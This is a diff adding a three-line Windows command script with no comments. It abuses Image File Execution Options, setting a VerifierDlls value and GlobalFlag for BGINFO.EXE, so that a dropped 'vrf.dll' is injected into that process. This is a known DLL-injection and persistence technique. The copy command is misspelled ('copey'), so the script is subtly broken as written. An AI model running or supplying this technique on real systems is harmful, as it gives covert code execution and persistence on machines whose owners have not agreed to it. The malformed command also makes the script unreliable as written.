@@ -1,0 +1,6 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /v VerifierDlls /d "vrf.dll" /reg:32 /f
+
+copey vrf.dll c:\Windows\SysWOW64
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGINFO.EXE" /v GlobalFlag /t REG_DWORD /d 256 /reg:32
+
